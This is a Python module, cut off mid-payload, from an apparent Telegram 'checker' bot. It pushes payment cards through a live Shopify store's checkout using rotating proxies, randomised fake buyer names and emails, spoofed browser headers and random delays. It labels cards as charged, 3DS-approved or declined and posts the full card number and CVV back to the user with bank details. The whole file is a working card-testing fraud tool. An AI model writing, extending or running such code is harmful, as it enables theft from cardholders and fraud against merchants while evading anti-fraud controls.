# BOT/gates/charge/shopify/shopify_direct.py

import json
import asyncio
import re
import time
import random
import string
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully")
except ImportError as e:
    print(f"❌ Proxy system import error: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY HTTP CHECKOUT]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: meta-app-prod-store-1.myshopify.com
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHECKOUT COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except:
        gateway = "Shopify Self Site 💷"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "DECLINED - " in raw_response:
        response_display = raw_response.split("DECLINED - ")[-1]
        if ":" in response_display:
            response_display = response_display.split(":")[0].strip()
        response_display = response_display.split('\n')[0]
        if len(response_display) > 30:
            response_display = response_display[:27] + "..."
    elif "ORDER_PLACED - " in raw_response:
        response_display = "ORDER_PLACED"
    elif "APPROVED - " in raw_response:
        response_display = "APPROVED"
    elif "GENERIC_ERROR" in raw_response:
        if ":" in raw_response:
            response_display = raw_response.split(":")[0].strip()
        else:
            response_display = "GENERIC_ERROR"
    elif "PROXY_DEAD" in raw_response:
        response_display = "PROXY_DEAD"
    elif "NO_PROXY_AVAILABLE" in raw_response:
        response_display = "NO_PROXY_AVAILABLE"
    elif "SESSION_TOKEN_NOT_FOUND" in raw_response:
        response_display = "SESSION_TOKEN_NOT_FOUND"
    elif "CAPTCHA" in raw_response.upper():
        response_display = "CAPTCHA"
    elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
        response_display = "3D_SECURE"
    elif "INSUFFICIENT" in raw_response.upper():
        response_display = "INSUFFICIENT_FUNDS"
    elif "INVALID" in raw_response.upper():
        response_display = "INVALID_CARD"
    elif "EXPIRED" in raw_response.upper():
        response_display = "EXPIRED_CARD"
    elif "FRAUD" in raw_response.upper():
        response_display = "FRAUD"
    else:
        if ":" in raw_response:
            response_display = raw_response.split(":")[0].strip()
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        else:
            response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

    raw_response_upper = raw_response.upper()

    # FIXED: Only show Charged if we have actual success indicators AND no receipt error
    if any(keyword in raw_response_upper for keyword in [
        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
        "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
        "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
        "SHOPIFY_PAYMENTS", "SHOP_PAY", "LIVE", "ORDER_CONFIRMED",
        "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
        "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
    ]) and "NO RECEIPT" not in raw_response_upper and "SESSION_TOKEN_NOT_FOUND" not in raw_response_upper:
        status_flag = "Charged ✅"
    elif any(keyword in raw_response_upper for keyword in [
        "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
        "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
        "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
        "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
        "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
    ]):
        status_flag = "Captcha ⚠️"
    elif any(keyword in raw_response_upper for keyword in [
        "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
        "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
        "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
        "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
    ]):
        status_flag = "Declined ❌"
    elif any(keyword in raw_response_upper for keyword in [
        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
    ]):
        status_flag = "Declined ❌"
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
    ]):
        status_flag = "Declined ❌"
    elif any(keyword in raw_response_upper for keyword in [
        "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
    ]):
        status_flag = "Declined ❌"
    elif any(keyword in raw_response_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
        "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
        "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
        "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
        "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
    ]):
        status_flag = "Approved ❎"
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
    ]):
        status_flag = "Declined ❌"
    elif any(keyword in raw_response_upper for keyword in [
        "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
        "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
    ]):
        status_flag = "Fraud ⚠️"
    elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
        status_flag = "Proxy Error 🚫"
    elif "SESSION_TOKEN_NOT_FOUND" in raw_response_upper:
        status_flag = "Declined ❌"
    else:
        status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== HTTP CHECKOUT CLASS ==========
class ShopifyHTTPCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_handle = "retailer-id-fix-no-mapping"
        self.product_url = f"{self.base_url}/products/{self.product_handle}"
        
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False
        self.proxy_response_time = 0.0

        self.client = None

        self.headers = {
            'authority': 'meta-app-prod-store-1.myshopify.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
        }

        self.checkout_token = None
        self.session_token = None
        self.graphql_session_token = None
        self.receipt_id = None
        self.cart_token = None
        self.variant_id = "43207284392098"
        self.product_id = "7890988171426"

        self.proposal_id = None
        self.submit_id = None
        self.delivery_strategy_handle = None

        self.logger = ShopifyLogger(user_id)

        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", "Trump"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,99)}@gmail.com"
        self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"

    async def random_delay(self, min_sec=0.5, max_sec=2.0):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url):
        patterns = [
            r'/checkouts/cn/([^/?]+)',
            r'/checkout/[^/]+/cn/([^/?]+)',
            r'token=([^&]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        return None

    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_tracking_ids(self):
        return self.generate_uuid(), self.generate_uuid()

    def generate_timestamp(self):
        return str(int(time.time() * 1000))

    def construct_graphql_session_token(self):
        if not self.checkout_token:
            return None
        timestamp = self.generate_timestamp()
        return f"{self.checkout_token}-{timestamp}"

    def extract_bootstrap_data(self, html_content):
        try:
            patterns = [
                r'window\.__INITIAL_STATE__\s*=\s*({.+?});',
                r'window\.__DATA__\s*=\s*({.+?});',
                r'"checkoutToken":"([^"]+)"',
                r'"proposalId":"([^"]+)"',
                r'"submitForCompletionId":"([^"]+)"',
                r'operationName":"Proposal".*?"id":"([^"]+)"',
                r'operationName":"SubmitForCompletion".*?"id":"([^"]+)"'
            ]

            extracted = {}
            for pattern in patterns:
                matches = re.findall(pattern, html_content)
                if matches:
                    extracted[pattern] = matches[0]

            return extracted
        except Exception as e:
            self.logger.error_log("EXTRACTION", f"Failed to extract bootstrap: {str(e)}")
            return {}

    def extract_delivery_strategy(self, html_content):
        try:
            pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
            matches = re.findall(pattern, html_content)
            if matches:
                return matches[0]

            pattern2 = r'"handle":"([a-f0-9]+-[a-f0-9]+)"'
            matches2 = re.findall(pattern2, html_content)
            if matches2:
                for match in matches2:
                    if len(match) > 30:
                        return match
            return None
        except:
            return None

    async def get_checkout_page(self, max_retries=3):
        """Get checkout page - no token extraction from HTML anymore"""
        for attempt in range(max_retries):
            try:
                self.step(5 if attempt == 0 else 5 + attempt, "LOAD CHECKOUT", 
                         f"Loading native checkout page (Attempt {attempt + 1}/{max_retries})", 
                         f"Token: {self.checkout_token[:15]}..." if self.checkout_token else "None")

                checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
                checkout_params = {
                    '_r': self.generate_random_string(32),
                    'auto_redirect': 'false',
                    'edge_redirect': 'true',
                    'skip_shop_pay': 'true'
                }

                checkout_headers = {
                    **self.headers,
                    'referer': self.base_url + '/',
                    'sec-fetch-site': 'cross-site'
                }

                resp = await self.client.get(checkout_url, headers=checkout_headers, params=checkout_params, 
                                            timeout=30, follow_redirects=True)

                if resp.status_code != 200:
                    self.logger.error_log("CHECKOUT_PAGE", f"Status: {resp.status_code}", f"Attempt {attempt + 1}")
                    if attempt < max_retries - 1:
                        await self.random_delay(2, 4)
                        continue
                    return False, f"Failed to load checkout: {resp.status_code}"

                page_content = resp.text

                self.logger.data_extracted("Response Headers", str(dict(resp.headers)), "HTTP Response")

                # Token will be obtained from Proposal response, not HTML
                return True, page_content

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error: {str(e)}", f"Attempt {attempt + 1}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                if attempt < max_retries - 1:
                    self.proxy_url = get_proxy_for_user(self.user_id, "random")
                    if not self.proxy_url:
                        return False, "NO_PROXY_AVAILABLE"
                    self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                    await self.random_delay(2, 4)
                    continue
                return False, "PROXY_DEAD"
            except httpx.ConnectTimeout as e:
                self.logger.error_log("TIMEOUT", f"Connection timeout: {str(e)}", f"Attempt {attempt + 1}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                if attempt < max_retries - 1:
                    self.proxy_url = get_proxy_for_user(self.user_id, "random")
                    if not self.proxy_url:
                        return False, "NO_PROXY_AVAILABLE"
                    self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                    await self.random_delay(2, 4)
                    continue
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("CHECKOUT_ERROR", str(e), f"Attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    await self.random_delay(2, 4)
                    continue
                return False, f"Checkout page error: {str(e)}"

        return False, "CHECKOUT_PAGE_FAILED"

    async def execute_checkout(self, cc, mes, ano, cvv):
        try:
            self.step(0, "GET PROXY", "Getting random proxy for user", f"User ID: {self.user_id}")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available in system")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                
                start_test = time.time()
                try:
                    test_resp = await self.client.get("https://ipinfo.io/json", timeout=5)
                    self.proxy_response_time = time.time() - start_test
                    
                    if test_resp.status_code == 200:
                        self.proxy_status = "Live ⚡️"
                        self.proxy_used = True
                        self.logger.data_extracted("Proxy Info", f"{self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s", "Proxy System")
                        mark_proxy_success(self.proxy_url, self.proxy_response_time)
                    else:
                        self.proxy_status = "Dead 🚫"
                        mark_proxy_failed(self.proxy_url)
                        await self.client.aclose()
                        return False, "PROXY_DEAD"
                        
                except Exception as e:
                    self.proxy_status = "Dead 🚫"
                    mark_proxy_failed(self.proxy_url)
                    await self.client.aclose()
                    return False, "PROXY_DEAD"
            else:
                self.logger.error_log("PROXY", "Proxy system not available")
                return False, "PROXY_SYSTEM_UNAVAILABLE"

            self.step(1, "INIT SESSION", "Getting homepage with proxy", f"Proxy: {self.proxy_url[:30]}...")

            shopify_y, shopify_s = self.generate_tracking_ids()

            initial_cookies = {
                'localization': 'US',
                '_shopify_y': shopify_y,
                '_shopify_s': shopify_s,
                'cart_currency': 'USD'
            }

            self.client.cookies.update(initial_cookies)

            start_time = time.time()
            try:
                resp = await self.client.get(self.base_url, headers=self.headers, timeout=30)
                request_time = time.time() - start_time
                
                if resp.status_code != 200:
                    self.logger.error_log("HOMEPAGE", f"Failed to load homepage: {resp.status_code}")
                    mark_proxy_failed(self.proxy_url)
                    self.proxy_status = "Dead 🚫"
                    return False, f"Failed to load homepage: {resp.status_code}"
                
                mark_proxy_success(self.proxy_url, request_time)
                
            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on homepage: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except httpx.ConnectTimeout as e:
                self.logger.error_log("TIMEOUT", f"Connection timeout on homepage: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("CONNECTION", f"Homepage error: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, f"Connection error: {str(e)[:50]}"

            await self.random_delay(1, 2)

            self.step(2, "ADD TO CART", "Adding product to cart with proxy", f"Variant: {self.variant_id}")

            cart_headers = {
                **self.headers,
                'accept': 'application/javascript',
                'origin': self.base_url,
                'referer': self.product_url,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest'
            }

            boundary = f"----WebKitFormBoundary{self.generate_random_string(16)}"
            cart_headers['content-type'] = f'multipart/form-data; boundary={boundary}'

            payload_lines = [
                f'--{boundary}',
                'Content-Disposition: form-data; name="quantity"',
                '',
                '1',
                f'--{boundary}',
                'Content-Disposition: form-data; name="form_type"',
                '',
                'product',
                f'--{boundary}',
                'Content-Disposition: form-data; name="utf8"',
                '',
                '✓',
                f'--{boundary}',
                'Content-Disposition: form-data; name="id"',
                '',
                self.variant_id,
                f'--{boundary}',
                'Content-Disposition: form-data; name="product-id"',
                '',
                self.product_id,
                f'--{boundary}',
                'Content-Disposition: form-data; name="section-id"',
                '',
                'template--15468374917282__main',
                f'--{boundary}',
                'Content-Disposition: form-data; name="sections"',
                '',
                'cart-notification-product,cart-notification-button,cart-icon-bubble',
                f'--{boundary}',
                'Content-Disposition: form-data; name="sections_url"',
                '',
                f'/products/{self.product_handle}',
                f'--{boundary}--'
            ]

            cart_payload = '\r\n'.join(payload_lines)

            try:
                resp = await self.client.post(
                    f"{self.base_url}/cart/add",
                    headers=cart_headers,
                    content=cart_payload,
                    timeout=30
                )

                if resp.status_code != 200:
                    self.logger.error_log("CART_ADD", f"Failed to add to cart: {resp.status_code}")
                    return False, f"Failed to add to cart: {resp.status_code}"

                try:
                    cart_data = resp.json()
                    if 'items' in cart_data and len(cart_data['items']) > 0:
                        self.cart_token = cart_data['items'][0].get('key', '').split(':')[0]
                except:
                    pass

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on cart add: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("CART_ERROR", f"Cart add error: {str(e)}")
                return False, f"Cart add error: {str(e)[:50]}"

            await self.random_delay(1, 2)

            self.step(3, "GET CART", "Loading cart page with proxy")

            cart_page_headers = {
                **self.headers,
                'referer': self.product_url,
                'sec-fetch-site': 'same-origin'
            }

            try:
                resp = await self.client.get(f"{self.base_url}/cart", headers=cart_page_headers, timeout=30)
            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on cart page: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"

            await self.random_delay(1, 2)

            self.step(4, "START CHECKOUT", "Initiating checkout process with proxy")

            checkout_start_headers = {
                **self.headers,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': self.product_url,
                'sec-fetch-site': 'same-origin'
            }

            try:
                resp = await self.client.post(
                    f"{self.base_url}/cart",
                    headers=checkout_start_headers,
                    data={'checkout': ''},
                    follow_redirects=True,
                    timeout=30
                )

                current_url = str(resp.url)
                self.checkout_token = self.extract_checkout_token(current_url)

                if not self.checkout_token:
                    match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
                    if match:
                        self.checkout_token = match.group(1)

                if not self.checkout_token:
                    return False, "Could not extract checkout token"

                self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "URL")

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on checkout start: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("CHECKOUT_START", f"Checkout start error: {str(e)}")
                return False, f"Checkout start error: {str(e)[:50]}"

            await self.random_delay(2, 3)

            # Step 5: Load checkout page (no token extraction from HTML)
            success, page_content = await self.get_checkout_page(max_retries=3)

            if not success:
                return False, page_content

            bootstrap_data = self.extract_bootstrap_data(page_content)
            self.logger.data_extracted("Bootstrap Data", str(list(bootstrap_data.keys())), "Page")

            self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
            if self.delivery_strategy_handle:
                self.logger.data_extracted("Delivery Strategy", self.delivery_strategy_handle, "Page")
            else:
                self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"

            if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
                self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
            else:
                self.proposal_id = "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"

            if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
                self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
            else:
                self.submit_id = "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"

            await self.random_delay(2, 3)

            # Step 6: Submit Proposal mutation - TOKEN WILL BE EXTRACTED FROM RESPONSE
            self.step(6, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", self.email)

            graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"

            stable_id = self.generate_uuid()

            # Use placeholder session token for first proposal request
            # Real token will be returned in response headers
            temp_session_token = self.construct_graphql_session_token()

            proposal_variables = {
                "sessionInput": {
                    "sessionToken": temp_session_token
                },
                "queueToken": f"{self.generate_random_string(43)}==",
                "discounts": {
                    "lines": [],
